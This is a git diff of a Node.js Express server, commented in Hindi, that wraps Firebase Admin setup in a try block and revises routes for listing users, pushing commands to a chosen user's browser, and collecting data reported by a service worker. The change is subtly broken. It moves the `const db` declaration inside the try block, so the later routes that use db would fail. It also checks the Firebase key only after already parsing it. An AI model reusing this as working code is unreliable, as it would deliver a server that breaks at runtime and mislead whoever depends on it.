@@ -5,19 +5,26 @@ const express = require('express');
 const webpush = require('web-push');
 const bodyParser = require('body-parser');
 const path = require('path');
-const admin = require('firebase-admin'); // Firebase की एडमिन लाइब्रेरी
+// सबसे ज़रूरी बदलाव: Firebase की एडमिन लाइब्रेरी जोड़ना
+const admin = require('firebase-admin');
 
 // =================================================================
-// 2. Firebase एडमिन को शुरू करना (यह नया और ज़रूरी है)
+// 2. Firebase एडमिन को शुरू करना (यह सबसे ज़रूरी नया हिस्सा है)
 // =================================================================
-// यह सर्विस अकाउंट कुंजी Render के एनवायरनमेंट वेरिएबल्स में रखी जाएगी
-const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
+// यह 'मास्टर चाबी' Render के एनवायरनमेंट वेरिएबल्स से सुरक्षित रूप से आएगी
+try {
+    const serviceAccount = JSON.parse(process.env.FIREBASE_SERVICE_ACCOUNT_KEY);
 
-admin.initializeApp({
-  credential: admin.credential.cert(serviceAccount)
-});
+    admin.initializeApp({
+      credential: admin.credential.cert(serviceAccount)
+    });
 
-const db = admin.firestore(); // Firestore डेटाबेस से कनेक्शन
+    const db = admin.firestore(); // Firestore डेटाबेस से कनेक्शन
+    console.log("Firebase Admin सफलतापूर्वक शुरू हो गया है।");
+} catch (error) {
+    console.error("Firebase Admin को शुरू करने में विफल: सुनिश्चित करें कि FIREBASE_SERVICE_ACCOUNT_KEY सही है।", error);
+    process.exit(1);
+}
 
 // =================================================================
 // 3. सर्वर और VAPID कुंजियों को सेटअप करें (यह पहले जैसा ही है)
@@ -29,8 +36,9 @@ app.use(express.static(path.join(__dirname, 'public')));
 const publicVapidKey = process.env.PUBLIC_VAPID_KEY;
 const privateVapidKey = process.env.PRIVATE_VAPID_KEY;
 
+// जांचें कि क्या सभी ज़रूरी चाबियाँ मौजूद हैं
 if (!publicVapidKey || !privateVapidKey || !process.env.FIREBASE_SERVICE_ACCOUNT_KEY) {
-    console.error("एक या अधिक एनवायरनमेंट वेरिएबल्स सेट नहीं हैं!");
+    console.error("एक या अधिक एनवायरनमेंट वेरिएबल्स (VAPID or Firebase) सेट नहीं हैं!");
     process.exit(1);
 }
 
@@ -40,15 +48,17 @@ webpush.setVapidDetails('mailto:your-email@example.com', publicVapidKey, private
 // 4. API रूट्स (Endpoints) - अब ये Firestore से बात करेंगे
 // =================================================================
 
-let reportedData = []; // सर्विस वर्कर से आने वाले डेटा को अस्थायी रूप से स्टोर करने के लिए
+// इस वेरिएबल को अभी भी सर्विस वर्कर से आने वाले लाइव डेटा के लिए रखा गया है
+let reportedData = [];
 
-// ---- रूट 1: सभी उपयोगकर्ताओं की लिस्ट प्राप्त करना ----
+// ---- रूट 1: एडमिन पैनल के लिए सभी उपयोगकर्ताओं की लिस्ट लाना ----
 app.get('/get-users', async (req, res) => {
     try {
-        const usersSnapshot = await db.collection('users').get();
+        const usersSnapshot = await db.collection('users').orderBy('lastLogin', 'desc').get();
         const users = [];
         usersSnapshot.forEach(doc => {
             const userData = doc.data();
+            // हम एडमिन पैनल को सिर्फ ज़रूरी जानकारी भेजते हैं, टोकन नहीं
             users.push({
                 uid: userData.uid,
                 displayName: userData.displayName,
@@ -58,25 +68,25 @@ app.get('/get-users', async (req, res) => {
         });
         res.status(200).json(users);
     } catch (error) {
-        console.error("उपयोगकर्ताओं को लाने में त्रुटि:", error);
+        console.error("Firestore से उपयोगकर्ताओं को लाने में त्रुटि:", error);
         res.status(500).json({ status: 'error', message: 'Failed to fetch users.' });
     }
 });
 
 
-// ---- रूट 2: किसी खास उपयोगकर्ता को कमांड भेजना ----
+// ---- रूट 2: किसी चुने हुए उपयोगकर्ता को कमांड भेजना (अब ज़्यादा स्मार्ट है) ----
 app.post('/send-command', async (req, res) => {
-    const { userId, command } = req.body; // अब हम userId और command दोनों लेते हैं
+    const { userId, command } = req.body;
 
     if (!userId || !command) {
         return res.status(400).json({ status: 'error', message: 'User ID and command are required.' });
     }
 
     try {
-        // Firestore से उस उपयोगकर्ता का दस्तावेज़ प्राप्त करें
+        // Firestore से उस खास उपयोगकर्ता का दस्तावेज़ प्राप्त करें
         const userDoc = await db.collection('users').doc(userId).get();
         if (!userDoc.exists) {
-            return res.status(404).json({ status: 'error', message: 'User not found.' });
+            return res.status(404).json({ status: 'error', message: 'User not found in database.' });
         }
 
         const userData = userDoc.data();
@@ -98,12 +108,11 @@ app.post('/send-command', async (req, res) => {
 });
 
 
-// ---- रूट 3 और 4 (अपरिवर्तित) ----
+// ---- रूट 3 और 4 (अपरिवर्तित) - लाइव डेटा को संभालने के लिए ----
 app.post('/report-data', (req, res) => {
     const data = req.body;
     data.timestamp = new Date().toISOString();
     reportedData.push(data);
-    console.log("सिम्बायोट से डेटा प्राप्त हुआ:", data);
     res.status(200).json({ status: 'success' });
 });
 
